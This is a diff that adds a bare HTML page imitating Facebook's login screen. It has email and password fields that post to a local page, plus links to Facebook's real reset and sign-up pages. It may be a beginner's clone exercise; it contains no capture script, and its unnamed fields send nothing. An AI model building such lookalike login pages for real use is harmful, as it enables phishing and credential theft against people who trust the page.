@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="" content="">
+    <title></title>
+    <link rel="stylesheet" href="style.css" title="" type="" />
+  </head>
+  <body id="container">
+    <div class="heading1">
+      <h1>Log In Facebook</h1>
+    </div>
+    <br />
+    <br />
+    <div class="input">
+     <form action="index2.html" method="POST" accept-charset="utf-8">
+ 
+      <input type="text" name="" id="" value="" placeholder="Email or username" required/>
+      <br />
+      <br />
+      <input type="password" name="" id="" value=""placeholder="Enter Password" required/>
+      <br />
+      <br />
+      <button type="submit">Submit</button>
+      
+    </div>
+    <br />
+    <br />
+    <div>
+      <div class="forget">
+        <a href="https://m.facebook.com/login/identify">Forget Password? </a>
+      </div>
+      <br />
+      
+      <div class="account">
+        <a href="https://m.facebook.com/r.php?hrc=1&soft=hjk">Create new account </a> 
+      </div>
+      <br />
+      <br />
+      </form>
+      <p class="footer">&copy;Alright copyright disclaimer  </p>
+    </div>
+  </body>
+</html
